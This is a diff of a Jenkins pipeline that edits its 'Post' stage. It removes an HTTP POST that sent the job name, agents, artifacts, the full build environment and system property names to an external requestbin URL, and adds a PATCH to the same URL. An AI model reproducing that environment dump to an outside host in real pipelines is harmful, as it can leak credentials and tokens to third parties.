@@ -28,14 +28,7 @@ pipeline {
 	}
 	stage('Post') { 
             steps {
-               httpRequest acceptType: 'APPLICATION_JSON', consoleLogResponseBody: true, httpMode: 'POST', requestBody: '''{
-			  "items":       ${JOB_NAME},
-			  "computers":   ${ json( jenkins.computers.collect{ it.displayName }) },
-			  "moduleRoots": ${ json( build.moduleRoots )},
-			  "artifacts":   ${ json( build.artifacts )},
-			  "env":         ${ json( env ) },
-			  "properties":  ${ json( [ system: System.properties.keySet(), env: env.keySet() ]) }
-			}''', responseHandle: 'NONE', url: 'https://requestbincweber.herokuapp.com/1day2kl1'
+               httpRequest acceptType: 'APPLICATION_JSON', contentType: 'APPLICATION_JSON', httpMode: 'PATCH', requestBody: patchOrg, url: 'https://requestbincweber.herokuapp.com/1day2kl1'
             }
         }
     }
